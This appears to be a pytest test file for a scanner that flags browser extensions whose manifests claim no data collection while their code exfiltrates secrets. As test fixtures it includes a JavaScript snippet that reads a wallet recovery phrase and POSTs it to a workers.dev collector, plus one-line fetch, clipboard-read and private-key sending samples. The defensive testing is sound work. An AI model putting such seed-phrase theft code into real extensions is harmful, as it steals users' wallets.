"""Tests for extension_manifest_liar_scanner.py — pure functions, no I/O."""
import json

import pytest

import extension_manifest_liar_scanner as e

LYING_MANIFEST = json.dumps({
    "manifest_version": 3,
    "name": "totally-harmless-tool",
    "claims_no_data_collection": True,
    "permissions": ["storage"],
})

HONEST_MANIFEST = json.dumps({
    "manifest_version": 3,
    "name": "wallet",
    "claims_no_data_collection": False,
    "permissions": ["storage"],
})

WALLET_CODE = """
async function importWallet() {
  const phrase = document.getElementById('mnemonic').value;
  const words = phrase.trim().split(/\\s+/);
  if (words.length === 12 || words.length === 24) {
    await fetch('https://collector.workers.dev/import', {
      method: 'POST', body: JSON.stringify({seed_phrase: phrase})
    });
  }
}
"""

CLEAN_CODE = """
document.getElementById('btn').addEventListener('click', () => {
  document.body.classList.toggle('dark');
});
"""


def test_manifest_lie_flagged_critical():
    r = e.audit_extension(LYING_MANIFEST, {"bg.js": WALLET_CODE})
    assert r["worst"] == "CRITICAL"
    assert any(f["flag"] == "MANIFEST_LIE" for f in r["findings"])


def test_honest_manifest_no_lie():
    r = e.audit_extension(HONEST_MANIFEST, {"bg.js": WALLET_CODE})
    assert not any(f["flag"] == "MANIFEST_LIE" for f in r["findings"])
    # code findings still reported
    assert any(f["flag"] == "RECOVERY_PHRASE" for f in r["findings"])


def test_clean_extension_clean():
    r = e.audit_extension(HONEST_MANIFEST, {"ui.js": CLEAN_CODE})
    assert r["worst"] == "CLEAN"


def test_private_key_flagged():
    r = e.audit_extension(HONEST_MANIFEST,
                          {"k.js": "send(private_key)"})
    assert any(f["flag"] == "PRIVATE_KEY" for f in r["findings"])


def test_clipboard_read_flagged():
    r = e.audit_extension(HONEST_MANIFEST,
                          {"c.js": "navigator.clipboard.readText()"})
    assert any(f["flag"] == "CLIPBOARD_READ" for f in r["findings"])


def test_worker_exfil_flagged():
    r = e.audit_extension(HONEST_MANIFEST,
                          {"x.js": "fetch('https://a.workers.dev/y')"})
    assert any(f["flag"] == "WORKER_EXFIL" for f in r["findings"])


def test_sensitive_permission_flagged():
    m = json.dumps({"manifest_version": 3, "name": "x",
                    "permissions": ["clipboardRead", "storage"]})
    r = e.audit_extension(m, {"u.js": CLEAN_CODE})
    assert any(f["flag"] == "SENSITIVE_PERMISSION" for f in r["findings"])


def test_invalid_manifest_raises():
    with pytest.raises(ValueError):
        e.audit_extension("{bad", {})


def test_lie_requires_code_or_secrets():
    # claims no collection but code is clean: no lie flag
    r = e.audit_extension(LYING_MANIFEST, {"u.js": CLEAN_CODE})
    assert not any(f["flag"] == "MANIFEST_LIE" for f in r["findings"])


def test_cli_missing_manifest_errors():
    assert e.main(["--manifest", "/nonexistent.json"]) == 2


def test_cli_full_run(tmp_path, capsys):
    mp = tmp_path / "manifest.json"
    mp.write_text(LYING_MANIFEST)
    cp = tmp_path / "bg.js"
    cp.write_text(WALLET_CODE)
    assert e.main(["--manifest", str(mp), "--code", str(cp)]) == 1
    assert "MANIFEST_LIE" in capsys.readouterr().out


def test_cli_json_flag(tmp_path, capsys):
    mp = tmp_path / "manifest.json"
    mp.write_text(HONEST_MANIFEST)
    assert e.main(["--manifest", str(mp), "--json"]) == 0
    assert "CLEAN" in capsys.readouterr().out
